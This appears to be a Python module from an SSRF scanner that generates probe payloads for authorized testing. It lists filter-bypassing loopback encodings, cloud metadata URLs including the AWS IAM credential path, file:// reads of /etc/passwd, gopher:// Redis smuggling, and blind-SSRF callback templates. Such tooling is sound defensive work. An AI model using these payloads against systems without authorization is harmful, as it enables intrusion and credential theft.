"""SSRF probe payload generation.

The payloads here are the ones a defender or an authorized penetration tester
uses to check whether a server-side request can be steered at an unintended
destination. They are intentionally generic (loopback, link-local, common cloud
metadata endpoints, alternate IP encodings, alternate URL schemes) so that a
finding can be confirmed against a target you are permitted to test, and then
handed to the owner to fix.

Nothing here exfiltrates data on its own; a payload only becomes meaningful when
the target actually issues the request, which the engine detects either from the
HTTP response or from an out-of-band callback.
"""

from __future__ import annotations

from dataclasses import dataclass, field
from typing import Iterable


@dataclass(frozen=True)
class Payload:
    """A single SSRF probe value plus enough context to triage a hit."""

    value: str
    category: str
    description: str
    # Substrings whose presence in a response body is a strong signal that the
    # server followed the payload (best-effort; the engine treats these as hints,
    # not proof).
    response_markers: tuple[str, ...] = field(default_factory=tuple)

    def rendered(self, token: str | None = None) -> str:
        """Return the payload, substituting an OAST token where one is expected.

        Payloads that carry the literal ``{token}`` placeholder are blind-SSRF
        probes: the token is a unique subdomain/path the callback listener can
        attribute back to this exact request.
        """
        if token is None:
            return self.value
        return self.value.replace("{token}", token)

    @property
    def is_oob(self) -> bool:
        return "{token}" in self.value


# Loopback / localhost, including the encodings that bypass naive "is it
# 127.0.0.1?" string checks.
def _loopback() -> list[Payload]:
    host = "http://{host}/"
    variants = [
        ("127.0.0.1", "dotted loopback"),
        ("localhost", "loopback hostname"),
        ("0.0.0.0", "all-interfaces address"),
        ("0", "shorthand for 0.0.0.0"),
        ("127.1", "abbreviated loopback"),
        ("2130706433", "127.0.0.1 as a 32-bit integer"),
        ("0x7f.0x0.0x0.0x1", "hex-encoded loopback octets"),
        ("0177.0.0.1", "octal first octet"),
        ("[::1]", "IPv6 loopback"),
        ("[::ffff:127.0.0.1]", "IPv4-mapped IPv6 loopback"),
    ]
    return [
        Payload(host.format(host=h), "loopback", f"Loopback via {desc}")
        for h, desc in variants
    ]


# Cloud instance metadata services. Reaching these from a victim server is the
# classic high-impact SSRF; the markers are stable strings those endpoints or
# their well-known paths return.
def _metadata() -> list[Payload]:
    return [
        Payload(
            "http://169.254.169.254/latest/meta-data/",
            "cloud-metadata",
            "AWS/OpenStack instance metadata root",
            ("ami-id", "instance-id", "iam/"),
        ),
        Payload(
            "http://169.254.169.254/latest/meta-data/iam/security-credentials/",
            "cloud-metadata",
            "AWS IAM role credential listing",
            ("AccessKeyId", "Token", "Expiration"),
        ),
        Payload(
            "http://metadata.google.internal/computeMetadata/v1/",
            "cloud-metadata",
            "GCP metadata root (needs Metadata-Flavor: Google)",
            ("computeMetadata", "project/", "instance/"),
        ),
        Payload(
            "http://100.100.100.200/latest/meta-data/",
            "cloud-metadata",
            "Alibaba Cloud instance metadata",
            ("instance-id", "region-id"),
        ),
        Payload(
            "http://169.254.169.254/metadata/instance?api-version=2021-02-01",
            "cloud-metadata",
            "Azure IMDS (needs Metadata: true)",
            ("compute", "azEnvironment", "subscriptionId"),
        ),
    ]


# Non-HTTP schemes worth trying when the fetcher is a generic URL loader.
def _schemes() -> list[Payload]:
    return [
        Payload("file:///etc/passwd", "scheme", "Local file read (Unix)",
                ("root:x:0:0", "/bin/")),
        Payload("file:///c:/windows/win.ini", "scheme", "Local file read (Windows)",
                ("[fonts]", "for 16-bit app support")),
        Payload("dict://{host}:11211/stats", "scheme",
                "dict:// against an internal service"),
        Payload("gopher://{host}:6379/_INFO%0d%0a", "scheme",
                "gopher:// smuggling toward Redis"),
    ]


# Out-of-band probes for blind SSRF: the response tells you nothing, but a hit
# on the callback listener proves the request was made.
def _oob() -> list[Payload]:
    return [
        Payload("http://{token}/", "oob", "Blind SSRF via HTTP callback"),
        Payload("http://{token}/ssrf", "oob", "Blind SSRF with a path marker"),
        Payload("https://{token}/", "oob", "Blind SSRF over HTTPS"),
    ]


_STATIC: tuple[Payload, ...] = tuple(
    _loopback() + _metadata() + _schemes()
)


def all_payloads(
    *,
    include_metadata: bool = True,
    include_schemes: bool = True,
    include_oob: bool = True,
    oob_domain: str | None = None,
) -> list[Payload]:
    """Build the payload set for a run.

    ``oob_domain`` is the base domain of your callback listener (for example
    ``oast.example.com``). When given, each OOB payload's ``{token}`` is expanded
    by the engine into ``<token>.<oob_domain>``; here we just keep the templates.
    """
    out: list[Payload] = list(_loopback())
    if include_metadata:
        out.extend(_metadata())
    if include_schemes:
        out.extend(_schemes())
    if include_oob and oob_domain:
        out.extend(_oob())
    return out


def categories() -> set[str]:
    return {p.category for p in all_payloads(oob_domain="x")}


def filter_by_category(payloads: Iterable[Payload], category: str) -> list[Payload]:
    return [p for p in payloads if p.category == category]
